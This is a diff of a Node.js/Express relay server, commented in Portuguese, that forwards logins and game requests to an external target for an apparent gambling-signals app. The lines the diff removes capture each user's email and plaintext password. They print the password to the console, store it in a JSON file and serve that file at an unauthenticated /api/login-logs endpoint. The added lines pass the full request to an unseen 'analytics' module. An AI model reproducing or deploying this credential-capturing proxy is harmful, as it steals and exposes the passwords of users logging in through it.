@@ -3,11 +3,13 @@ import express from 'express';
 import { createServer } from 'http';
 import { Server } from 'socket.io';
 import path from 'path';
-import fs from 'fs';
 import { fileURLToPath } from 'url';
 import fetch from 'node-fetch';
 import cors from 'cors';
 import { loadAllExistingSignalIds, appendToCsv, getFullHistory, SOURCES } from './src/utils/csvService.js';
+
+// --- IMPORTAÇÃO DO NOVO MÓDULO DE ANALYTICS ---
+import analytics from './loginAnalytics.js';
 
 console.log(`\n\n${'='.repeat(60)}`);
 console.log(`--- INICIANDO SERVIDOR --- ${new Date().toISOString()}`);
@@ -17,41 +19,6 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 const app = express();
 const httpServer = createServer(app);
-
-// --- ARQUIVO DE LOG DE LOGINS ---
-const LOGIN_LOG_FILE = path.join(__dirname, 'login_attempts.json');
-
-// Inicializa arquivo de log se não existir
-if (!fs.existsSync(LOGIN_LOG_FILE)) {
-    fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify([], null, 2));
-    console.log(`📁 Arquivo de log criado: ${LOGIN_LOG_FILE}`);
-}
-
-// Função para salvar tentativa de login
-function saveLoginAttempt(data) {
-    try {
-        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
-        attempts.push(data);
-        fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify(attempts, null, 2));
-        console.log(`💾 Login salvo no arquivo (total: ${attempts.length})`);
-    } catch (err) {
-        console.error('❌ Erro ao salvar login:', err.message);
-    }
-}
-
-// Função para atualizar tentativa de login
-function updateLoginAttempt(index, updates) {
-    try {
-        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
-        if (attempts[index]) {
-            Object.assign(attempts[index], updates);
-            fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify(attempts, null, 2));
-            console.log(`💾 Login #${index} atualizado`);
-        }
-    } catch (err) {
-        console.error('❌ Erro ao atualizar login:', err.message);
-    }
-}
 
 // --- SOCKET.IO ---
 const io = new Server(httpServer, {
@@ -94,8 +61,6 @@ async function testAuthServer() {
 testAuthServer();
 
 // --- MIDDLEWARES GLOBAIS ---
-
-// Log de TODAS as requisições
 app.use((req, res, next) => {
     const start = Date.now();
     console.log(`\n📥 [${new Date().toISOString()}] ${req.method} ${req.url}`);
@@ -109,48 +74,24 @@ app.use((req, res, next) => {
 });
 
 app.use(cors());
-
-// Body parsers
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- ROTA /login (FETCH MANUAL) ---
+// --- ROTA /login (COM ANALYTICS INTEGRADO) ---
 app.post('/login', async (req, res) => {
     const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/login`;
     const bodyData = JSON.stringify(req.body);
-    
-    // Extrai credenciais
-    const email = req.body.email || req.body.username || req.body.user || 'N/A';
-    const password = req.body.password || req.body.senha || req.body.pass || 'N/A';
+    const startTime = Date.now(); // Início da medição de tempo para analytics
+
+    // Extrai credenciais apenas para log no console (Analytics cuida do arquivo)
+    const email = req.body.email || req.body.username || 'N/A';
     
     console.log(`\n${'═'.repeat(60)}`);
-    console.log(`🔐 [LOGIN REQUEST]`);
-    console.log(`${'═'.repeat(60)}`);
+    console.log(`🔐 [LOGIN REQUEST] -> ${targetUrl}`);
     console.log(`   📧 Email: ${email}`);
-    console.log(`   🔑 Senha: ${password}`);
-    console.log(`   🌐 IP: ${req.ip || req.headers['x-forwarded-for'] || 'unknown'}`);
-    console.log(`   📱 User-Agent: ${req.headers['user-agent'] || 'unknown'}`);
     console.log(`${'═'.repeat(60)}`);
-    
-    // Salva no arquivo
-    const loginIndex = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8')).length;
-    saveLoginAttempt({
-        timestamp: new Date().toISOString(),
-        email,
-        password,
-        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
-        userAgent: req.headers['user-agent'] || 'unknown',
-        body: req.body,
-        status: 'pending'
-    });
-    
-    console.log(`\n🚀 [FETCH REQUEST]`);
-    console.log(`   Target: ${targetUrl}`);
-    console.log(`   Body: ${bodyData}`);
     
     try {
-        const startTime = Date.now();
-        
         const response = await fetch(targetUrl, {
             method: 'POST',
             headers: {
@@ -163,31 +104,26 @@ app.post('/login', async (req, res) => {
         
         const elapsed = Date.now() - startTime;
         const responseText = await response.text();
-        
-        console.log(`\n📥 [FETCH RESPONSE]`);
-        console.log(`   Status: ${response.status} (${elapsed}ms)`);
-        console.log(`   Headers:`);
-        response.headers.forEach((value, key) => {
-            console.log(`      ${key}: ${value}`);
+        const success = response.status >= 200 && response.status < 300;
+
+        // --- INTEGRAÇÃO ANALYTICS (SUCESSO OU FALHA HTTP) ---
+        analytics.logLoginAttempt(req, {
+            success: success,
+            statusCode: response.status,
+            responseTime: elapsed,
+            errorType: success ? null : `HTTP_${response.status}`,
+            errorMessage: success ? null : `Status Code ${response.status}`
         });
-        console.log(`   Body: ${responseText.substring(0, 500)}${responseText.length > 500 ? '...' : ''}`);
+
+        console.log(`\n📥 [FETCH RESPONSE] Status: ${response.status} (${elapsed}ms)`);
         
-        // Atualiza o log
-        updateLoginAttempt(loginIndex, {
-            status: response.status,
-            response: responseText.substring(0, 1000),
-            responseTime: new Date().toISOString(),
-            elapsed
-        });
-        
-        // Repassa os headers da resposta (exceto os problemáticos)
+        // Repassa os headers (limpeza)
         response.headers.forEach((value, key) => {
             if (!['content-encoding', 'transfer-encoding', 'content-length'].includes(key.toLowerCase())) {
                 res.setHeader(key, value);
             }
         });
         
-        // Tenta parsear como JSON, senão manda como texto
         try {
             const jsonResponse = JSON.parse(responseText);
             res.status(response.status).json(jsonResponse);
@@ -196,16 +132,16 @@ app.post('/login', async (req, res) => {
         }
         
     } catch (err) {
-        console.error(`\n❌ [FETCH ERROR]`);
-        console.error(`   Message: ${err.message}`);
-        console.error(`   Code: ${err.code || 'N/A'}`);
+        const elapsed = Date.now() - startTime;
+        console.error(`\n❌ [FETCH ERROR]: ${err.message}`);
         
-        // Atualiza o log
-        updateLoginAttempt(loginIndex, {
-            status: 'ERROR',
-            error: err.message,
-            errorCode: err.code,
-            responseTime: new Date().toISOString()
+        // --- INTEGRAÇÃO ANALYTICS (ERRO DE REDE/CÓDIGO) ---
+        analytics.logLoginAttempt(req, {
+            success: false,
+            statusCode: 500, // Erro interno/rede
+            responseTime: elapsed,
+            errorType: err.code || 'NETWORK_ERROR',
+            errorMessage: err.message
         });
         
         res.status(500).json({ 
@@ -216,13 +152,27 @@ app.post('/login', async (req, res) => {
     }
 });
 
-// --- ROTA /start-game (FETCH MANUAL) ---
-app.all(/\/start-game\/.*/, async (req, res) => {
-    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}${req.url}`;
+// --- NOVAS ROTAS DE ANALYTICS ---
+
+// 1. Relatório processado (Insights, Gráficos)
+app.get('/api/analytics/report', (req, res) => {
+    const report = analytics.analyzePatterns();
+    res.json(report);
+});
+
+// 2. Imprimir relatório no console do servidor (para debug rápido)
+app.post('/api/analytics/print', (req, res) => {
+    analytics.printAnalyticsReport();
+    res.json({ message: 'Relatório impresso no console do servidor' });
+});
+
+// --- ROTA /start-game ---
+app.all(/\/start-game.*/, async (req, res) => {
+    // Normaliza a URL removendo o prefixo local e mantendo query params/caminhos
+    const cleanPath = req.url.replace('/start-game', ''); 
+    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/start-game${cleanPath}`;
     
-    console.log(`\n🎮 [START-GAME]`);
-    console.log(`   Target: ${targetUrl}`);
-    console.log(`   Method: ${req.method}`);
+    console.log(`\n🎮 [START-GAME] -> ${targetUrl}`);
     
     try {
         const fetchOptions = {
@@ -231,50 +181,6 @@ app.all(/\/start-game\/.*/, async (req, res) => {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json',
                 'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
-            }
-        };
-        
-        if (req.headers.authorization) {
-            fetchOptions.headers['Authorization'] = req.headers.authorization;
-            console.log(`   Auth: ${req.headers.authorization.substring(0, 30)}...`);
-        }
-        
-        if (req.method !== 'GET' && req.body && Object.keys(req.body).length > 0) {
-            fetchOptions.body = JSON.stringify(req.body);
-            console.log(`   Body: ${fetchOptions.body}`);
-        }
-        
-        const response = await fetch(targetUrl, fetchOptions);
-        const responseText = await response.text();
-        
-        console.log(`   Response: ${response.status}`);
-        
-        try {
-            const jsonResponse = JSON.parse(responseText);
-            res.status(response.status).json(jsonResponse);
-        } catch {
-            res.status(response.status).send(responseText);
-        }
-        
-    } catch (err) {
-        console.error(`❌ [START-GAME ERROR]: ${err.message}`);
-        res.status(500).json({ error: true, message: err.message });
-    }
-});
-
-// Rota para /start-game sem path adicional
-app.all('/start-game', async (req, res) => {
-    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/start-game`;
-    
-    console.log(`\n🎮 [START-GAME]`);
-    console.log(`   Target: ${targetUrl}`);
-    
-    try {
-        const fetchOptions = {
-            method: req.method,
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
             }
         };
         
@@ -388,26 +294,6 @@ app.get('/api/full-history', async (req, res) => {
     }
 });
 
-// Endpoint para ver os logs de login
-app.get('/api/login-logs', (req, res) => {
-    try {
-        const attempts = JSON.parse(fs.readFileSync(LOGIN_LOG_FILE, 'utf-8'));
-        res.json(attempts);
-    } catch (error) {
-        res.status(500).json({ error: 'Erro ao ler logs', details: error.message });
-    }
-});
-
-// Endpoint para limpar logs
-app.delete('/api/login-logs', (req, res) => {
-    try {
-        fs.writeFileSync(LOGIN_LOG_FILE, JSON.stringify([], null, 2));
-        res.json({ success: true, message: 'Logs limpos' });
-    } catch (error) {
-        res.status(500).json({ error: 'Erro ao limpar logs', details: error.message });
-    }
-});
-
 app.get('/health', (req, res) => res.status(200).json({ 
     status: 'OK', 
     socket: 'active',
@@ -425,15 +311,18 @@ const startServer = async () => {
     const PORT = process.env.PORT || 3000;
     try {
         await loadAllExistingSignalIds();
+        
+        // Imprime relatório inicial se houver dados
+        console.log('📊 Carregando analytics...');
+        // analytics.printAnalyticsReport(); // Opcional: descomentar se quiser ver ao iniciar
+
         httpServer.listen(PORT, '0.0.0.0', () => {
             console.log(`\n${'='.repeat(60)}`);
             console.log(`🚀 SERVIDOR RODANDO NA PORTA ${PORT}`);
             console.log(`${'='.repeat(60)}`);
-            console.log(`📌 Fonte 'brasileira' (Antiga): Ativa (Polling)`);
-            console.log(`📌 Fonte 'Brasileira PlayTech' (Nova): Ativa (Socket + Polling)`);
-            console.log(`🔐 Logging de credenciais: ATIVO`);
-            console.log(`📁 Arquivo de logs: ${LOGIN_LOG_FILE}`);
-            console.log(`🌐 Ver logs: http://localhost:${PORT}/api/login-logs`);
+            console.log(`📌 Fontes de dados ativas e monitorando.`);
+            console.log(`📈 Analytics de Login: ATIVO`);
+            console.log(`   Use GET /api/analytics/report para ver estatísticas.`);
             console.log(`${'='.repeat(60)}\n`);
             fetchAllData(); 
             setInterval(fetchAllData, FETCH_INTERVAL_MS); 
